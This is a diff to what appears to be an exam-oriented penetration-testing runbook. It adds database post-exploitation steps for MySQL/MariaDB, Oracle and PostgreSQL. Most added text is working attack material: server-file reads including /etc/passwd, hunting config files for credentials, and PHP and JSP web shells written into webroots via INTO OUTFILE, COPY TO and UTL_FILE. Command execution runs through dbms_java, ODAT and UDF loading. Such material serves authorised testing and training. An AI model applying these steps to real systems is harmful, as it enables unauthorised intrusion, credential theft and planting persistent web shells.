@@ -2397,11 +2397,19 @@ mariadb --no-defaults --protocol=tcp --connect-timeout=5 --host='<TARGET_IP>' --
 
 For verified TLS use `PGSSLMODE=verify-full PGSSLROOTCERT='<CA>'` and the certificate hostname, or `--ssl --ssl-ca='<CA>' --ssl-verify-server-cert`. Do not fall back to plaintext after a trust failure.
 
+From a shell on the target, when the account is bound to loopback:
+
+```bash
+mariadb --no-defaults --protocol=tcp --connect-timeout=5 --host='127.0.0.1' --port='<PORT>' --user='<USERNAME>' --password
+```
+
+`--password` prompts, so the value stays out of `ps`. `-p'<PASSWORD>'` is the same login with the value in argv.
+
 | Result | Next |
 | --- | --- |
 | SQL prompt | **DB-02**. |
 | Engine is MSSQL with an ODBC client | **DB-03**. |
-| Oracle listener identified | **DB-06**. |
+| Oracle listener identified | **DB-21**. |
 | Password or account denied | **NET-05**. |
 | Certificate or hostname failure | **PAUSE-ROUTE**. |
 | Refused, timeout or DNS failure | **NET-03** or **PAUSE-ROUTE**. |
@@ -2430,8 +2438,10 @@ Check `SHOW GRANTS` or `Ssl_cipher` only when the next decision needs them.
 | Relevant schema or rights | **NET-05** for the matching application. |
 | IMPERSONATE or linked-server right | **DB-09** / **DB-10**. |
 | `xp_dirtree` enabled | **DB-11**. |
-| FILE privilege and writable plugin directory | **DB-12**. |
-| Oracle listener with usable credentials | **DB-13**. |
+| MySQL or MariaDB prompt | **DB-15**. |
+| `FILE` with an empty or wide `secure_file_priv` | **DB-16** / **DB-17**. |
+| `FILE` and a writable plugin directory | **DB-12**. |
+| Oracle session with `UTL_FILE` or Java | **DB-22** / **DB-13**. |
 | PostgreSQL program or server-file right | **DB-07** / **DB-08**. |
 | Permission denied | **NET-05**. |
 | Server identity differs | **PAUSE-ROUTE**. |
@@ -2440,42 +2450,103 @@ The question set follows the [source checklist](../references/checklist.md).
 
 # oracle
 
-Confirm the engine from its response before picking a client. One supplied identity per endpoint.
+Supplied-account Oracle, or local OS access as the Oracle owner. Start at DB-21;
+DB-01 proves the listener first. Directory objects bound every file path, and
+`UTL_FILE` never accepts an arbitrary path.
 
-## DB-06. Can the Oracle identity read bounded metadata?
+## DB-21. Can the observed Oracle identity authenticate?
 
-Enter with a verified Oracle listener and assigned service/wallet context.
+Enter with a verified listener, one in-scope service and a supplied account, or a
+local shell as the Oracle owner.
+
+Question: Which login path accepts this identity?
+
+Local OS authentication, from the Oracle owner's shell:
 
 ```bash
-python3 - <<'PY'
-import getpass, oracledb, sys
-sys.stdin = open('/dev/tty', 'r', encoding='utf-8')
-host = input('Hostname: ').strip(); port = int(input('Port: '))
-service = input('Service: ').strip(); user = input('User: ').strip()
-mode = input('Transport [tcps/plain-lab]: ').strip()
-wallet = input('Wallet dir (tcps): ').strip() or None
-con = oracledb.connect(user=user, password=getpass.getpass('Password: '), host=host, port=port,
-  service_name=service, protocol='tcps' if mode == 'tcps' else 'tcp', wallet_location=wallet,
-  ssl_server_dn_match=True, tcp_connect_timeout=5)
-try:
-    with con.cursor() as c:
-        c.execute("SELECT SYS_CONTEXT('USERENV','SESSION_USER'), SYS_CONTEXT('USERENV','DB_NAME') FROM dual")
-        print(list(c))
-        c.execute('SELECT owner, object_type, object_name FROM user_objects FETCH FIRST 30 ROWS ONLY')
-        print(list(c))
-finally:
-    con.close()
-PY
+sqlplus -S '/ as sysdba'
+```
+
+Supplied account over loopback; the password is prompted:
+
+```bash
+sqlplus -S '<USERNAME>@//127.0.0.1:<PORT>/<SERVICE>'
+```
+
+With only the Python client, DB-06 performs the same connect. `lsnrctl status`
+names registered services when one service is rejected.
+
+| Result | Next |
+| --- | --- |
+| SQL prompt | **DB-06**. |
+| ORA-01017 | **DB-01** with the supplied identity, else **GAP-ACCESS**. |
+| ORA-12514 or unknown service | Recheck the service from `lsnrctl status`; **DB-21**. |
+| Timeout or TNS failure | **NET-03** / **PAUSE-ROUTE**. |
+
+## DB-06. What does this Oracle identity expose?
+
+Enter from DB-21. Run the statements separately; the directory objects and
+session privileges decide the file steps.
+
+```sql
+SELECT SYS_CONTEXT('USERENV','SESSION_USER'), SYS_CONTEXT('USERENV','DB_NAME') FROM dual;
+SELECT privilege FROM session_privs ORDER BY privilege;
+SELECT directory_name, directory_path FROM all_directories;
+SELECT owner, object_type, object_name FROM user_objects FETCH FIRST 30 ROWS ONLY;
 ```
 
 | Result | Next |
 | --- | --- |
-| Identity and metadata returned | **NET-05**. |
-| Login or service rejected | **NET-05**. |
-| TLS or wallet failure | **PAUSE-ROUTE**. |
-| Query unavailable | **PAUSE-COVERAGE**. |
+| `UTL_FILE` and a mapped directory object | **DB-22** / **DB-23**. |
+| `CREATE PROCEDURE` and Java installed | **DB-13**. |
+| Only metadata | **NET-05** for the matching application. |
+| ORA-00942 on a view | Recheck the grant; **PAUSE-COVERAGE**. |
 
-## DB-13. Can Oracle be attacked with ODAT? (optional)
+## DB-22. Can this identity read one file through a directory object?
+
+Enter from DB-06 with `UTL_FILE` executable and a directory object that maps to
+a useful path. `get_line` returns one line per call.
+
+```sql
+SET SERVEROUTPUT ON
+DECLARE f utl_file.file_type; b varchar2(32767);
+BEGIN
+  f := utl_file.fopen('<DIRECTORY_OBJECT>', '<FILE>', 'R');
+  utl_file.get_line(f, b);
+  dbms_output.put_line(b);
+  utl_file.fclose(f);
+END;
+/
+```
+
+| Result | Next |
+| --- | --- |
+| Line returned | Read the config for credentials; a hash goes to **PASS-02**. |
+| ORA-29280 invalid path | **DB-06** for a directory object that exists. |
+| ORA-06550 no grant | **DB-13** if Java is available. |
+
+## DB-23. Can this identity write one file?
+
+Enter from DB-06 with `UTL_FILE` executable and a directory object that maps to
+a served path. `W` truncates, so choose a new leaf.
+
+```sql
+DECLARE f utl_file.file_type;
+BEGIN
+  f := utl_file.fopen('<DIRECTORY_OBJECT>', 'owb-<ID>.jsp', 'W');
+  utl_file.put_line(f, '<%= "OWB-<ID>" %>');
+  utl_file.fclose(f);
+END;
+/
+```
+
+| Result | Next |
+| --- | --- |
+| File written | Request it from the web service, or **DB-13**. |
+| ORA-29280 wrong object | **DB-06**. |
+| ORA-06550 no grant | **DB-13**. |
+
+## DB-13. Can Oracle execute through ODAT or a Java route? (optional)
 
 **Optional.** Safe to skip under exam time pressure.
 
@@ -2484,19 +2555,122 @@ odat all -s '<TARGET_IP>' -p 1521
 odat dbms -s '<TARGET_IP>' -p 1521
 ```
 
-An exposed listener with default or weak credentials is the usual prerequisite.
+With `dbms_java` granted and the Oracle JVM installed:
+
+```sql
+EXEC dbms_java.runjava('<JAVA_CLASS>');
+```
+
+An exposed listener with supplied or default credentials is the prerequisite.
 
 | Result | Next |
 | --- | --- |
-| Credentials or privileges found | **DB-06** for metadata, then ODAT modules. |
+| Command or credentials | **EXP-01** for a shell. |
 | Listener only | **PAUSE-COVERAGE**. |
-| No ODAT | **DB-06**. |
+| No ODAT and no Java | **DB-06**. |
 
 # postgresql
 
-Confirm the engine from its response before picking a client. One supplied identity per endpoint.
+Supplied-account PostgreSQL, or local peer access. Start at DB-18; DB-01 proves
+the endpoint first. `pg_read_server_files` and `pg_execute_server_program` decide
+the read and execute steps.
+
+## DB-18. Can the observed PostgreSQL identity authenticate over socket or loopback?
+
+Enter when DB-01 reached a PostgreSQL prompt, or a supplied role and one observed
+endpoint are both in scope.
+
+Question: Which local path does this role accept?
+
+Peer authentication over the socket, when the OS user matches a role:
+
+```bash
+psql -X -w -d postgres
+```
+
+Supplied role over the socket, then loopback:
+
+```bash
+PGSSLMODE=disable PGCONNECT_TIMEOUT=5 psql -X -W --host '/var/run/postgresql' --port='<PORT>' --username '<USERNAME>' --dbname '<DB>'
+PGHOSTADDR='127.0.0.1' PGSSLMODE=disable PGCONNECT_TIMEOUT=5 psql -X -W --host '127.0.0.1' --port='<PORT>' --username '<USERNAME>' --dbname '<DB>'
+```
+
+`-W` prompts and `-w` never prompts; `PGPASSWORD` keeps the value out of `ps`.
+`127.0.0.1` only from a shell on the target.
+
+| Result | Next |
+| --- | --- |
+| `psql` prompt | **DB-19**. |
+| Password or role denied | **DB-01** with the supplied identity, else **GAP-ACCESS**. |
+| TLS required | Add `PGSSLMODE=verify-full PGSSLROOTCERT='<CA>'` and the certificate hostname. |
+| Refused or timeout | **NET-03**. |
+
+## DB-19. What does this PostgreSQL role expose?
+
+Send each statement separately.
+
+```sql
+SELECT current_user, session_user, version(), current_database(), inet_server_addr(), inet_server_port();
+SELECT rolsuper, pg_has_role(current_user,'pg_read_server_files','USAGE'), pg_has_role(current_user,'pg_execute_server_program','USAGE') FROM pg_roles WHERE rolname=current_user;
+SELECT datname FROM pg_database;
+SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema') LIMIT 40;
+SHOW data_directory;
+```
+
+| Result | Next |
+| --- | --- |
+| `pg_read_server_files` or superuser | **DB-08**. |
+| `pg_execute_server_program` or superuser | **DB-07**. |
+| Superuser and writable data directory | **DB-20**. |
+| Application table with hashes | **PASS-02** offline. |
+| No server-file right | **GAP-SERVICE**. |
+
+## DB-08. Can the PostgreSQL account read one relevant server file?
+
+Enter from DB-19 with `pg_read_server_files` or superuser.
+
+```sql
+SELECT pg_catalog.pg_read_binary_file('<FILE>', 0, 4096, true)::text;
+```
+
+Or decode the hex locally: `printf '%s' '<HEX>' | xxd -r -p | head -c 4096 | cat -v`.
+
+| Result | Next |
+| --- | --- |
+| Relevant content | Read the config for credentials; a hash goes to **PASS-02**. |
+| Missing file | **PAUSE-COVERAGE**. |
+| Permission denied | **DB-19**. |
+
+## DB-20. Can this role write one file?
+
+Enter as superuser, or with a role that owns the target directory. `COPY TO`
+overwrites an existing file and resolves a relative path against the data
+directory.
+
+```sql
+SHOW data_directory;
+COPY (SELECT '<MARKER>') TO '/tmp/owb-<ID>.txt';
+SELECT pg_catalog.pg_read_file('/tmp/owb-<ID>.txt');
+```
+
+A web shell only into a served directory:
+
+```sql
+COPY (SELECT '<?php echo "<ID>"; ?>') TO '<ABSOLUTE_WEBROOT>/owb-<ID>.php';
+```
+
+Clean up with `COPY (SELECT 1) TO PROGRAM 'rm -f <PATH>'` when DB-07 works,
+otherwise from a shell.
+
+| Result | Next |
+| --- | --- |
+| Marker written | **DB-07** if an execute right exists, else the web branch. |
+| Existing file | Choose a new leaf; `COPY` overwrites without asking. |
+| Permission denied | **DB-19** for rights and directory. |
 
 ## DB-07. Can this PostgreSQL role run a fixed server-side identity command?
+
+Enter from DB-19 with `pg_execute_server_program` or superuser.
 
 ```sql
 SELECT rolsuper, pg_has_role(current_user,'pg_execute_server_program','USAGE') FROM pg_roles WHERE rolname=current_user;
@@ -2510,27 +2684,105 @@ ROLLBACK;
 | Result | Next |
 | --- | --- |
 | uid/gid output, rolled back | **EXP-01** if a shell is needed. |
-| Permission denied | **DB-02** / **NET-05**. |
+| Permission denied | **DB-19**. |
 | No output or timeout | **PAUSE-COVERAGE**. |
 | Rollback unconfirmed | **PAUSE-RECOVERY**. |
 
-## DB-08. Can the PostgreSQL account read one relevant server file?
+# mysql
 
-```sql
-SELECT pg_catalog.pg_read_binary_file('<FILE>', 0, 4096, true)::text;
+Target-local or supplied-account MySQL/MariaDB. From a shell start at DB-14; from
+Kali, DB-01 proves the endpoint first. Confirm the engine and the exact identity
+before each step, and keep the client `--no-defaults` first so a local `my.cnf`
+cannot redirect the connection.
+
+## DB-14. Can the observed MySQL identity authenticate over socket or loopback?
+
+Enter when DB-01 reached a MySQL/MariaDB prompt, or a supplied account and one
+observed endpoint are both in scope.
+
+Question: Which local path does this account accept?
+
+Socket first, when `ss -lx` or `/var/run/mysqld` shows one:
+
+```bash
+mysql --no-defaults --protocol=socket --socket='<ABSOLUTE_SOCKET>' --user='<USERNAME>' --password --connect-timeout=5
 ```
 
-Or decode the hex locally: `printf '%s' '<HEX>' | xxd -r -p | head -c 4096 | cat -v`.
+If the account is TCP-only:
+
+```bash
+mysql --no-defaults --protocol=tcp --host='127.0.0.1' --port='<PORT>' --user='<USERNAME>' --password --connect-timeout=5 --disable-ssl
+```
+
+`--password` prompts, so the value stays out of `ps`; `-p'<PASSWORD>'` is the
+argv form. `127.0.0.1` only from a shell on the target. With the `mysql` client
+use `--ssl-mode=DISABLED` in place of `--disable-ssl`. Do not replace a supplied
+account with `root` guesses yet.
 
 | Result | Next |
 | --- | --- |
-| Relevant content | Matching application or service task. |
-| Missing file | **PAUSE-COVERAGE**. |
-| Permission denied | **NET-05**. |
+| Client prompt | **DB-15**. |
+| Password or account denied | **DB-01** with the supplied identity, else **GAP-ACCESS**. |
+| TLS required | Add `--ssl --ssl-ca='<CA>' --ssl-verify-server-cert`, or `--ssl-mode=REQUIRED` with the `mysql` client, and retry once. |
+| Refused or timeout | **NET-03**. |
 
-# mysql
+## DB-15. What does this MySQL identity read that changes the next step?
 
-Confirm the engine from its response before picking a client. One supplied identity per endpoint.
+Send each statement separately. `FILE`, `secure_file_priv` and the plugin
+directory decide the write and execution paths.
+
+```sql
+SELECT USER(), CURRENT_USER(), @@version, @@version_compile_os, @@hostname;
+SELECT @@secure_file_priv, @@plugin_dir, @@datadir, @@socket;
+SHOW GRANTS;
+SHOW DATABASES;
+SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys') LIMIT 40;
+```
+
+| Result | Next |
+| --- | --- |
+| `FILE` and an empty or wide `secure_file_priv` | **DB-16** for reads, **DB-17** for writes. |
+| `FILE` and a plugin directory inside `secure_file_priv` | **DB-12**. |
+| Application table with hashes | **PASS-02** offline. |
+| Plaintext credential in a table | **DB-01** for the matching service, or its branch. |
+| No `FILE` and no useful right | **GAP-SERVICE**. |
+
+## DB-16. Can this identity read one relevant server file?
+
+`secure_file_priv` permits only the path it names, and `LOAD_FILE` returns
+`NULL` for a denial, a directory, or an oversized file.
+
+```sql
+SELECT @@secure_file_priv;
+SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('<ABSOLUTE_OBSERVED_CONFIG>');
+```
+
+| Result | Next |
+| --- | --- |
+| File content | Read the supplied config for credentials; a hash goes to **PASS-02**. |
+| `NULL` | Check the `secure_file_priv` path at **DB-15**, then try **DB-17**. |
+| `FILE` denied | **DB-15**. |
+
+## DB-17. Can this identity write one file?
+
+Write an inert marker first, then a web shell only when the webroot falls inside
+`secure_file_priv`. `INTO OUTFILE` fails when the file already exists, and the
+file is owned by the SQL server account.
+
+```sql
+SELECT '<MARKER>' INTO OUTFILE '/tmp/owb-<ID>.txt';
+SELECT LOAD_FILE('/tmp/owb-<ID>.txt');
+SELECT '<?php echo "<ID>"; ?>' INTO OUTFILE '<ABSOLUTE_WEBROOT>/owb-<ID>.php';
+```
+
+| Result | Next |
+| --- | --- |
+| Marker written | **DB-12** if a plugin directory is writable, else the upload or web branch for the webroot. |
+| File exists | Choose a new `<ID>` leaf; never overwrite. |
+| Path or privilege denied | **DB-15** for `secure_file_priv`, then **GAP-SERVICE**. |
+
+Remove the marker and test file once their result is recorded.
 
 ## DB-12. Can MySQL load a UDF?
 
@@ -2538,7 +2790,9 @@ Confirm the engine from its response before picking a client. One supplied ident
 
 **Optional.** Safe to skip under exam time pressure.
 
-Enter with `FILE` privilege and a writable plugin directory.
+Enter from DB-15 or DB-17 with `FILE`, a plugin directory inside
+`secure_file_priv`, and a reviewed `.so` for this exact architecture. The
+resulting command runs as the SQL server account, not root.
 
 ```sql
 SHOW VARIABLES LIKE 'plugin_dir';
@@ -2560,7 +2814,7 @@ SELECT sys_exec('id > /tmp/owb');
 | --- | --- |
 | Function created and executes | **EXP-01** for a shell. |
 | `FUNCTION` error | Version/architecture mismatch; **PAUSE-COVERAGE**. |
-| No FILE privilege | **DB-02**. |
+| No FILE privilege | **DB-15**. |
 
 Drop the function and file only after the shell exists.
 
@@ -6389,6 +6643,46 @@ Oracle returns identity and owned objects only, no OS command.
 ## DB-12. What decides this step?
 
 A UDF writes a shared object into the plugin directory.
+
+## DB-14. What decides this step?
+
+The socket exists only when the server binds one; loopback TCP is the fallback when it does not. TLS is a transport condition, not a credential verdict.
+
+## DB-15. What decides this step?
+
+Version, grants and `secure_file_priv` bound every later file path. `USER()` is the presented account and `CURRENT_USER()` the matched grant identity; they can differ.
+
+## DB-16. What decides this step?
+
+`LOAD_FILE` needs `FILE` and a path inside `secure_file_priv`. `NULL` answers the path or privilege question, not whether the file is empty.
+
+## DB-17. What decides this step?
+
+`INTO OUTFILE` needs `FILE`, a path inside `secure_file_priv` and an absent leaf. The file stays owned by the server account, so cleanup needs that access.
+
+## DB-21. What decides this step?
+
+OS authentication depends on the shell's OS user, while a supplied account needs a registered service, not just an open listener.
+
+## DB-22. What decides this step?
+
+`UTL_FILE` reads only through a directory object and returns one line per call.
+
+## DB-23. What decides this step?
+
+`UTL_FILE` writes only through a directory object; `W` truncates an existing file.
+
+## DB-18. What decides this step?
+
+Peer authentication maps the OS user to a role over the socket; a role without that mapping needs the supplied account over loopback.
+
+## DB-19. What decides this step?
+
+Role attributes and memberships decide the read and execute steps; `data_directory` needs superuser or `pg_read_all_settings`.
+
+## DB-20. What decides this step?
+
+`COPY TO` needs an absolute, server-writable path and overwrites silently.
 
 ## DB-13. What decides this step?
 
